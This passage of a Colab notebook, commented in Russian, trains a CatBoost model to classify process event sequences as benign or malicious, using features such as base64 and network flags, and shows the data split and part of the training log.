              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-59cdd696-fe5a-4502-9c20-486073bc2fb6 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-59cdd696-fe5a-4502-9c20-486073bc2fb6');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "<div id=\"df-6b598424-23eb-4094-ac63-336649a3972c\">\n",
              "  <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-6b598424-23eb-4094-ac63-336649a3972c')\"\n",
              "            title=\"Suggest charts.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "  </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "  <script>\n",
              "    async function quickchart(key) {\n",
              "      const charts = await google.colab.kernel.invokeFunction(\n",
              "          'suggestCharts', [key], {});\n",
              "    }\n",
              "    (() => {\n",
              "      let quickchartButtonEl =\n",
              "        document.querySelector('#df-6b598424-23eb-4094-ac63-336649a3972c button');\n",
              "      quickchartButtonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "    })();\n",
              "  </script>\n",
              "</div>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf.info()\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QrXTIPeKgajz",
        "outputId": "6a231551-1fe7-49e3-825e-86cdc0bbdf6a"
      },
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "Int64Index: 3712 entries, 0 to 3711\n",
            "Data columns (total 7 columns):\n",
            " #   Column     Non-Null Count  Dtype \n",
            "---  ------     --------------  ----- \n",
            " 0   ProcessId  3712 non-null   int64 \n",
            " 1   binary     3712 non-null   object\n",
            " 2   EventID    3712 non-null   int8  \n",
            " 3   path       3712 non-null   object\n",
            " 4   unc_url    3712 non-null   int64 \n",
            " 5   b64        3712 non-null   int64 \n",
            " 6   network    3712 non-null   int64 \n",
            "dtypes: int64(4), int8(1), object(2)\n",
            "memory usage: 335.7+ KB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Сплит выборки"
      ],
      "metadata": {
        "id": "ZrBlMKtPPY-j"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "*проверочные данные*"
      ],
      "metadata": {
        "id": "Dvlpt4ErQGO3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "valid_lst = [10608, 10804, 10856, 10904, 11044, 11148, 11232, 1164, 1456, 1460, 1532, 1552, 1908, 1932, 1936, 2156, 2316, 2520, 2524, 2660, 2720, 2724, 2892, 2920, 2952, 3016, 3036, 3244, 3748, 3792, 4, 440, 4752, 4836, 5080, 5152, 5264, 5380, 5664, 5800, 5832, 6016, 6192, 6656, 672, 6796, 6808, 684, 6928, 7092, 7236, 7352, 7544, 7584, 7692, 7724, 7968, 8024, 8048, 8096, 8344, 8452, 8636, 8704, 8740, 8840, 8972, 9092, 9160, 9308, 9716, 9728, 9992]"
      ],
      "metadata": {
        "id": "wdIju3a4Ozhn"
      },
      "execution_count": 35,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "mal_lst = [10116, 10280, 11160, 1396, 1520, 1580, 2204, 2268, 3268, 4068, 4556, 6432, 7644, 8216, 8256, 9116, 9344, 9444, 9636, 976]"
      ],
      "metadata": {
        "id": "jfj86-RdO0wF"
      },
      "execution_count": 36,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Импорт модулей"
      ],
      "metadata": {
        "id": "HjscPZx2QIC1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.preprocessing import LabelEncoder, OneHotEncoder\n",
        "from sklearn.model_selection import train_test_split\n",
        "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
        "from datetime import datetime\n",
        "import numpy as np"
      ],
      "metadata": {
        "id": "vSPuRwKcQMVh"
      },
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Дополнительная функция"
      ],
      "metadata": {
        "id": "2b1bp4fTRdZ3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "MAX_TIMESTEPS = 128\n",
        "# number of features (except PID itself)\n",
        "N = len(newdf.columns) - 1\n",
        "\n",
        "def groupby_transform(dataframe, column):\n",
        "    global MAX_TIMESTEPS, N\n",
        "    total = len(dataframe.groupby(column))\n",
        "    start = datetime.now()\n",
        "    print(f\"Старт: {start}\")\n",
        "\n",
        "    print(f\"Всего категорий '{column}': '{total}'\")\n",
        "    print(f\"Уникальные значения: {dataframe[column].nunique()}\")\n",
        "\n",
        "    X = np.empty(shape=(0, MAX_TIMESTEPS, N)).astype(np.int16)\n",
        "    y = np.empty(shape=(0,1)).astype(np.int16)\n",
        "\n",
        "    binary_le = LabelEncoder().fit(['OTHER'] + list(dataframe['binary'].unique()))\n",
        "    path_le = LabelEncoder().fit(['OTHER'] + list(dataframe['path'].unique()))\n",
        "\n",
        "\n",
        "    try:\n",
        "        for i, (value, df) in enumerate(dataframe.groupby(column)):\n",
        "            # упрощение - пропуск менее 3 событий\n",
        "            if len(df) < 4:\n",
        "                continue\n",
        "\n",
        "            if value in valid_lst:\n",
        "                temp_y = np.array([0]).reshape(1,1)\n",
        "            elif value in mal_lst:\n",
        "                temp_y = np.array([1]).reshape(1,1)\n",
        "            else:\n",
        "                print(f'Неклассифицируемые ProcessID: {value}')\n",
        "                raise Exception\n",
        "\n",
        "            # Create 3D array\n",
        "            temp_X = np.hstack((\n",
        "                df[['EventID', 'unc_url', 'b64', 'network']].to_numpy(),\n",
        "                binary_le.transform(list(df['binary'])).reshape(-1,1),\n",
        "                path_le.transform(list(df['path'])).reshape(-1,1)\n",
        "            ))\n",
        "\n",
        "            # PADDING\n",
        "            temp_X = pad_sequences(temp_X.T, maxlen=MAX_TIMESTEPS).T\n",
        "\n",
        "            # adding this example to actual set\n",
        "            X = np.concatenate((X, temp_X.reshape(1, MAX_TIMESTEPS, N)))\n",
        "            y = np.concatenate((y, temp_y))\n",
        "\n",
        "        end = datetime.now()\n",
        "        print(f\"Конец: {end}\")\n",
        "        print(f\"Время выполнения сплита: {end - start}\")\n",
        "        return X, y\n",
        "\n",
        "    except KeyboardInterrupt:\n",
        "        end = datetime.now()\n",
        "        print(f\"Закончено:\\nитераций:{i}\\nвремя:{end}\")\n",
        "        print(f\"Время выполнения сплита: {end - start}\")\n",
        "        return X, y\n",
        "\n",
        "    except Exception as ex:\n",
        "        print(ex)\n",
        "        np.save(f'X{i}.npy', X)\n",
        "        np.save(f'y{i}.npy', y)"
      ],
      "metadata": {
        "id": "E_OFSLX8QrOd"
      },
      "execution_count": 33,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "X, y = groupby_transform(newdf, 'ProcessId')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5hYPF3xIQrLk",
        "outputId": "8c99438b-bf21-40da-a505-3319295a38c2"
      },
      "execution_count": 38,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Старт: 2023-08-24 15:07:48.054674\n",
            "Всего категорий 'ProcessId': '93'\n",
            "Уникальные значения: 93\n",
            "Конец: 2023-08-24 15:07:48.160939\n",
            "Время выполнения сплита: 0:00:00.106265\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "u, c = np.unique(y, return_counts=True)\n",
        "pos, neg = c\n",
        "pos, neg\n",
        "print(f\"Аномалии: {neg}\\nСработок: {pos}\")\n",
        "print(f\"Доля аномалий: {round(neg*100/(pos+neg),4)} %\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "q6uqcJGnQrIi",
        "outputId": "8964c613-fa9b-4323-bc24-eb7053159e5c"
      },
      "execution_count": 45,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Аномалии: 19\n",
            "Сработок: 61\n",
            "Доля аномалий: 23.75 %\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "X.shape\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "H3jnuZmJQrFN",
        "outputId": "cc7c00af-237d-4be9-f686-c7d77115388b"
      },
      "execution_count": 40,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(80, 128, 6)"
            ]
          },
          "metadata": {},
          "execution_count": 40
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "train_X, val_X, train_y, val_y = train_test_split(X, y, test_size=0.2)\n",
        "print(train_X.shape)\n",
        "print(train_y.shape)\n",
        "print(val_X.shape)\n",
        "print(val_y.shape)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iLKMrR3xSUeY",
        "outputId": "5b2e078f-96d0-4098-fbc3-2647e1494ddf"
      },
      "execution_count": 46,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(64, 128, 6)\n",
            "(64, 1)\n",
            "(16, 128, 6)\n",
            "(16, 1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**KILLBoosts**"
      ],
      "metadata": {
        "id": "bRWEDP-COsgc"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install catboost"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "GDIvc8BrOw4T",
        "outputId": "233a75c5-28ba-4965-eae8-a9539e9b63ba"
      },
      "execution_count": 42,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting catboost\n",
            "  Downloading catboost-1.2-cp310-cp310-manylinux2014_x86_64.whl (98.6 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m98.6/98.6 MB\u001b[0m \u001b[31m10.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: graphviz in /usr/local/lib/python3.10/dist-packages (from catboost) (0.20.1)\n",
            "Requirement already satisfied: matplotlib in /usr/local/lib/python3.10/dist-packages (from catboost) (3.7.1)\n",
            "Requirement already satisfied: numpy>=1.16.0 in /usr/local/lib/python3.10/dist-packages (from catboost) (1.23.5)\n",
            "Requirement already satisfied: pandas>=0.24 in /usr/local/lib/python3.10/dist-packages (from catboost) (1.5.3)\n",
            "Requirement already satisfied: scipy in /usr/local/lib/python3.10/dist-packages (from catboost) (1.10.1)\n",
            "Requirement already satisfied: plotly in /usr/local/lib/python3.10/dist-packages (from catboost) (5.15.0)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from catboost) (1.16.0)\n",
            "Requirement already satisfied: python-dateutil>=2.8.1 in /usr/local/lib/python3.10/dist-packages (from pandas>=0.24->catboost) (2.8.2)\n",
            "Requirement already satisfied: pytz>=2020.1 in /usr/local/lib/python3.10/dist-packages (from pandas>=0.24->catboost) (2023.3)\n",
            "Requirement already satisfied: contourpy>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (1.1.0)\n",
            "Requirement already satisfied: cycler>=0.10 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (0.11.0)\n",
            "Requirement already satisfied: fonttools>=4.22.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (4.42.0)\n",
            "Requirement already satisfied: kiwisolver>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (1.4.4)\n",
            "Requirement already satisfied: packaging>=20.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (23.1)\n",
            "Requirement already satisfied: pillow>=6.2.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (9.4.0)\n",
            "Requirement already satisfied: pyparsing>=2.3.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (3.1.1)\n",
            "Requirement already satisfied: tenacity>=6.2.0 in /usr/local/lib/python3.10/dist-packages (from plotly->catboost) (8.2.3)\n",
            "Installing collected packages: catboost\n",
            "Successfully installed catboost-1.2\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from catboost import CatBoostRegressor\n",
        "from catboost import Pool"
      ],
      "metadata": {
        "id": "tjTh3Gy-Ow1e"
      },
      "execution_count": 43,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "train_X_kill = train_X.reshape(train_X.shape[0], -1)\n",
        "val_X_kill = val_X.reshape(val_X.shape[0], -1)"
      ],
      "metadata": {
        "id": "80r_EML7W3ro"
      },
      "execution_count": 44,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model_cat = CatBoostRegressor(iterations=200, learning_rate=0.3, depth=4)"
      ],
      "metadata": {
        "id": "RSZLw9UrOwxQ"
      },
      "execution_count": 47,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model_cat.fit(train_X_kill, train_y)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "A8ZfTRtMOwt8",
        "outputId": "47af6ba3-5ca0-4c05-daa5-ccde0be05537"
      },
      "execution_count": 48,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0:\tlearn: 0.4505762\ttotal: 49.5ms\tremaining: 9.86s\n",
            "1:\tlearn: 0.4456850\ttotal: 53.2ms\tremaining: 5.26s\n",
            "2:\tlearn: 0.4298891\ttotal: 56.4ms\tremaining: 3.7s\n",
            "3:\tlearn: 0.4246602\ttotal: 59.7ms\tremaining: 2.92s\n",
            "4:\tlearn: 0.4176648\ttotal: 62.8ms\tremaining: 2.45s\n",
            "5:\tlearn: 0.4120445\ttotal: 65.9ms\tremaining: 2.13s\n",
            "6:\tlearn: 0.4069580\ttotal: 69.2ms\tremaining: 1.91s\n",
            "7:\tlearn: 0.4030958\ttotal: 72.3ms\tremaining: 1.73s\n",
            "8:\tlearn: 0.3935910\ttotal: 75.4ms\tremaining: 1.6s\n",
            "9:\tlearn: 0.3864941\ttotal: 78.6ms\tremaining: 1.49s\n",
            "10:\tlearn: 0.3780177\ttotal: 81.7ms\tremaining: 1.4s\n",
            "11:\tlearn: 0.3699748\ttotal: 84.8ms\tremaining: 1.33s\n",
            "12:\tlearn: 0.3667452\ttotal: 88.2ms\tremaining: 1.27s\n",
            "13:\tlearn: 0.3579625\ttotal: 91.3ms\tremaining: 1.21s\n",
            "14:\tlearn: 0.3307008\ttotal: 94.5ms\tremaining: 1.17s\n",
            "15:\tlearn: 0.3192568\ttotal: 97.7ms\tremaining: 1.12s\n",
            "16:\tlearn: 0.3063720\ttotal: 101ms\tremaining: 1.09s\n",
            "17:\tlearn: 0.2981253\ttotal: 104ms\tremaining: 1.05s\n",
            "18:\tlearn: 0.2867545\ttotal: 107ms\tremaining: 1.02s\n",
            "19:\tlearn: 0.2805836\ttotal: 110ms\tremaining: 994ms\n",
            "20:\tlearn: 0.2700880\ttotal: 114ms\tremaining: 968ms\n",
            "21:\tlearn: 0.2555026\ttotal: 117ms\tremaining: 944ms\n",
            "22:\tlearn: 0.2495400\ttotal: 120ms\tremaining: 922ms\n",
            "23:\tlearn: 0.2459588\ttotal: 123ms\tremaining: 901ms\n",
            "24:\tlearn: 0.2338732\ttotal: 126ms\tremaining: 881ms\n",
            "25:\tlearn: 0.2206369\ttotal: 129ms\tremaining: 863ms\n",
            "26:\tlearn: 0.2140231\ttotal: 132ms\tremaining: 846ms\n",
            "27:\tlearn: 0.2115719\ttotal: 135ms\tremaining: 830ms\n",
            "28:\tlearn: 0.2085243\ttotal: 138ms\tremaining: 814ms\n",
            "29:\tlearn: 0.2006817\ttotal: 141ms\tremaining: 800ms\n",
            "30:\tlearn: 0.1950774\ttotal: 144ms\tremaining: 785ms\n",
            "31:\tlearn: 0.1836815\ttotal: 149ms\tremaining: 780ms\n",
            "32:\tlearn: 0.1783589\ttotal: 152ms\tremaining: 767ms\n",
            "33:\tlearn: 0.1700025\ttotal: 155ms\tremaining: 756ms\n",
            "34:\tlearn: 0.1677835\ttotal: 158ms\tremaining: 745ms\n",
            "35:\tlearn: 0.1630095\ttotal: 161ms\tremaining: 735ms\n",
            "36:\tlearn: 0.1616547\ttotal: 164ms\tremaining: 724ms\n",
            "37:\tlearn: 0.1567167\ttotal: 167ms\tremaining: 714ms\n",
            "38:\tlearn: 0.1483206\ttotal: 171ms\tremaining: 704ms\n",
            "39:\tlearn: 0.1472631\ttotal: 174ms\tremaining: 695ms\n",
            "40:\tlearn: 0.1455515\ttotal: 177ms\tremaining: 686ms\n",
            "41:\tlearn: 0.1440785\ttotal: 180ms\tremaining: 677ms\n",
            "42:\tlearn: 0.1431885\ttotal: 183ms\tremaining: 669ms\n",
            "43:\tlearn: 0.1419170\ttotal: 188ms\tremaining: 668ms\n",
            "44:\tlearn: 0.1382633\ttotal: 191ms\tremaining: 659ms\n",
            "45:\tlearn: 0.1366430\ttotal: 195ms\tremaining: 652ms\n",
            "46:\tlearn: 0.1331181\ttotal: 198ms\tremaining: 644ms\n",
            "47:\tlearn: 0.1267638\ttotal: 201ms\tremaining: 637ms\n",
            "48:\tlearn: 0.1255212\ttotal: 204ms\tremaining: 629ms\n",
            "49:\tlearn: 0.1240864\ttotal: 207ms\tremaining: 622ms\n",
            "50:\tlearn: 0.1190997\ttotal: 210ms\tremaining: 615ms\n",
            "51:\tlearn: 0.1162147\ttotal: 214ms\tremaining: 608ms\n",
            "52:\tlearn: 0.1151069\ttotal: 217ms\tremaining: 601ms\n",
            "53:\tlearn: 0.1113690\ttotal: 220ms\tremaining: 595ms\n",
            "54:\tlearn: 0.1101377\ttotal: 224ms\tremaining: 590ms\n",
            "55:\tlearn: 0.1074750\ttotal: 227ms\tremaining: 583ms\n",
            "56:\tlearn: 0.1051532\ttotal: 230ms\tremaining: 577ms\n",
            "57:\tlearn: 0.1002376\ttotal: 233ms\tremaining: 571ms\n",
            "58:\tlearn: 0.0991859\ttotal: 237ms\tremaining: 565ms\n",
            "59:\tlearn: 0.0981859\ttotal: 240ms\tremaining: 559ms\n",
            "60:\tlearn: 0.0972793\ttotal: 243ms\tremaining: 553ms\n",
            "61:\tlearn: 0.0953130\ttotal: 249ms\tremaining: 554ms\n",
            "62:\tlearn: 0.0926264\ttotal: 253ms\tremaining: 551ms\n",
            "63:\tlearn: 0.0918071\ttotal: 257ms\tremaining: 546ms\n",
            "64:\tlearn: 0.0900323\ttotal: 260ms\tremaining: 541ms\n",
            "65:\tlearn: 0.0882989\ttotal: 263ms\tremaining: 535ms\n",
            "66:\tlearn: 0.0875649\ttotal: 267ms\tremaining: 530ms\n",
            "67:\tlearn: 0.0843622\ttotal: 272ms\tremaining: 527ms\n",
            "68:\tlearn: 0.0827494\ttotal: 275ms\tremaining: 522ms\n",
            "69:\tlearn: 0.0791671\ttotal: 278ms\tremaining: 516ms\n",
            "70:\tlearn: 0.0784043\ttotal: 281ms\tremaining: 511ms\n",
            "71:\tlearn: 0.0777467\ttotal: 284ms\tremaining: 505ms\n",
            "72:\tlearn: 0.0753819\ttotal: 288ms\tremaining: 500ms\n",
            "73:\tlearn: 0.0738690\ttotal: 291ms\tremaining: 495ms\n",
            "74:\tlearn: 0.0705960\ttotal: 294ms\tremaining: 490ms\n",
            "75:\tlearn: 0.0681811\ttotal: 297ms\tremaining: 485ms\n",
            "76:\tlearn: 0.0671850\ttotal: 301ms\tremaining: 480ms\n",
            "77:\tlearn: 0.0663114\ttotal: 304ms\tremaining: 475ms\n",
            "78:\tlearn: 0.0637507\ttotal: 307ms\tremaining: 470ms\n",
            "79:\tlearn: 0.0632085\ttotal: 310ms\tremaining: 465ms\n",
            "80:\tlearn: 0.0601105\ttotal: 313ms\tremaining: 460ms\n",
            "81:\tlearn: 0.0593442\ttotal: 317ms\tremaining: 455ms\n",
            "82:\tlearn: 0.0588450\ttotal: 320ms\tremaining: 451ms\n",
            "83:\tlearn: 0.0584082\ttotal: 323ms\tremaining: 446ms\n",
            "84:\tlearn: 0.0575774\ttotal: 326ms\tremaining: 441ms\n",
            "85:\tlearn: 0.0564768\ttotal: 329ms\tremaining: 436ms\n",
            "86:\tlearn: 0.0557445\ttotal: 333ms\tremaining: 432ms\n",
            "87:\tlearn: 0.0541147\ttotal: 336ms\tremaining: 427ms\n",
            "88:\tlearn: 0.0537150\ttotal: 339ms\tremaining: 423ms\n",
            "89:\tlearn: 0.0531415\ttotal: 342ms\tremaining: 418ms\n",
            "90:\tlearn: 0.0508454\ttotal: 345ms\tremaining: 414ms\n",
            "91:\tlearn: 0.0504830\ttotal: 348ms\tremaining: 409ms\n",
            "92:\tlearn: 0.0498222\ttotal: 352ms\tremaining: 404ms\n",
            "93:\tlearn: 0.0478380\ttotal: 355ms\tremaining: 400ms\n",
            "94:\tlearn: 0.0464690\ttotal: 358ms\tremaining: 396ms\n",
            "95:\tlearn: 0.0461927\ttotal: 361ms\tremaining: 391ms\n",
            "96:\tlearn: 0.0455384\ttotal: 364ms\tremaining: 387ms\n",
            "97:\tlearn: 0.0453001\ttotal: 369ms\tremaining: 384ms\n",
            "98:\tlearn: 0.0447319\ttotal: 372ms\tremaining: 380ms\n",
            "99:\tlearn: 0.0445182\ttotal: 375ms\tremaining: 375ms\n",
            "100:\tlearn: 0.0434887\ttotal: 379ms\tremaining: 371ms\n",
            "101:\tlearn: 0.0421969\ttotal: 382ms\tremaining: 367ms\n",
            "102:\tlearn: 0.0409839\ttotal: 385ms\tremaining: 362ms\n",
            "103:\tlearn: 0.0405730\ttotal: 388ms\tremaining: 358ms\n",
            "104:\tlearn: 0.0401462\ttotal: 391ms\tremaining: 354ms\n",
            "105:\tlearn: 0.0390344\ttotal: 394ms\tremaining: 350ms\n",
            "106:\tlearn: 0.0379568\ttotal: 397ms\tremaining: 345ms\n",
            "107:\tlearn: 0.0376142\ttotal: 401ms\tremaining: 341ms\n",
            "108:\tlearn: 0.0369102\ttotal: 404ms\tremaining: 337ms\n",
            "109:\tlearn: 0.0359730\ttotal: 407ms\tremaining: 333ms\n",
            "110:\tlearn: 0.0352927\ttotal: 410ms\tremaining: 329ms\n",
            "111:\tlearn: 0.0341308\ttotal: 413ms\tremaining: 325ms\n",
            "112:\tlearn: 0.0338738\ttotal: 417ms\tremaining: 321ms\n",
            "113:\tlearn: 0.0335203\ttotal: 420ms\tremaining: 317ms\n",
            "114:\tlearn: 0.0330256\ttotal: 423ms\tremaining: 312ms\n",
            "115:\tlearn: 0.0321589\ttotal: 426ms\tremaining: 308ms\n",
            "116:\tlearn: 0.0313351\ttotal: 429ms\tremaining: 304ms\n",
            "117:\tlearn: 0.0300963\ttotal: 432ms\tremaining: 300ms\n",
            "118:\tlearn: 0.0297465\ttotal: 435ms\tremaining: 296ms\n",
            "119:\tlearn: 0.0289583\ttotal: 438ms\tremaining: 292ms\n",
            "120:\tlearn: 0.0288187\ttotal: 442ms\tremaining: 288ms\n",
            "121:\tlearn: 0.0281408\ttotal: 447ms\tremaining: 285ms\n",
            "122:\tlearn: 0.0275602\ttotal: 451ms\tremaining: 283ms\n",
            "123:\tlearn: 0.0268072\ttotal: 454ms\tremaining: 278ms\n",
            "124:\tlearn: 0.0257069\ttotal: 458ms\tremaining: 275ms\n",
            "125:\tlearn: 0.0254223\ttotal: 461ms\tremaining: 271ms\n",
            "126:\tlearn: 0.0247732\ttotal: 464ms\tremaining: 267ms\n",
            "127:\tlearn: 0.0242846\ttotal: 467ms\tremaining: 263ms\n",
            "128:\tlearn: 0.0236686\ttotal: 470ms\tremaining: 259ms\n",
            "129:\tlearn: 0.0233279\ttotal: 474ms\tremaining: 255ms\n",
            "130:\tlearn: 0.0229058\ttotal: 477ms\tremaining: 251ms\n",
            "131:\tlearn: 0.0221799\ttotal: 480ms\tremaining: 247ms\n",
            "132:\tlearn: 0.0220603\ttotal: 483ms\tremaining: 243ms\n",
            "133:\tlearn: 0.0219364\ttotal: 486ms\tremaining: 240ms\n",
            "134:\tlearn: 0.0218292\ttotal: 489ms\tremaining: 236ms\n",
            "135:\tlearn: 0.0217325\ttotal: 493ms\tremaining: 232ms\n",
            "136:\tlearn: 0.0210450\ttotal: 496ms\tremaining: 228ms\n",
            "137:\tlearn: 0.0207451\ttotal: 499ms\tremaining: 224ms\n",
            "138:\tlearn: 0.0203298\ttotal: 502ms\tremaining: 220ms\n",
            "139:\tlearn: 0.0201201\ttotal: 505ms\tremaining: 217ms\n",
            "140:\tlearn: 0.0197167\ttotal: 509ms\tremaining: 213ms\n",
            "141:\tlearn: 0.0193770\ttotal: 512ms\tremaining: 209ms\n",
            "142:\tlearn: 0.0190037\ttotal: 515ms\tremaining: 205ms\n",
            "143:\tlearn: 0.0187002\ttotal: 518ms\tremaining: 202ms\n",
            "144:\tlearn: 0.0185959\ttotal: 521ms\tremaining: 198ms\n",
            "145:\tlearn: 0.0179027\ttotal: 525ms\tremaining: 194ms\n",
            "146:\tlearn: 0.0177470\ttotal: 528ms\tremaining: 190ms\n",
            "147:\tlearn: 0.0175686\ttotal: 531ms\tremaining: 187ms\n",
            "148:\tlearn: 0.0172796\ttotal: 534ms\tremaining: 183ms\n",
            "149:\tlearn: 0.0172117\ttotal: 537ms\tremaining: 179ms\n",
            "150:\tlearn: 0.0168177\ttotal: 540ms\tremaining: 175ms\n",
            "151:\tlearn: 0.0162338\ttotal: 544ms\tremaining: 172ms\n",
            "152:\tlearn: 0.0160691\ttotal: 547ms\tremaining: 168ms\n",
            "153:\tlearn: 0.0159224\ttotal: 550ms\tremaining: 164ms\n",
            "154:\tlearn: 0.0158114\ttotal: 553ms\tremaining: 161ms\n",
            "155:\tlearn: 0.0156862\ttotal: 556ms\tremaining: 157ms\n",
            "156:\tlearn: 0.0154743\ttotal: 559ms\tremaining: 153ms\n",
            "157:\tlearn: 0.0149981\ttotal: 563ms\tremaining: 150ms\n",
            "158:\tlearn: 0.0148241\ttotal: 566ms\tremaining: 146ms\n",
            "159:\tlearn: 0.0146893\ttotal: 569ms\tremaining: 142ms\n",
            "160:\tlearn: 0.0144423\ttotal: 572ms\tremaining: 139ms\n",
            "161:\tlearn: 0.0141445\ttotal: 575ms\tremaining: 135ms\n",
            "162:\tlearn: 0.0139460\ttotal: 578ms\tremaining: 131ms\n",
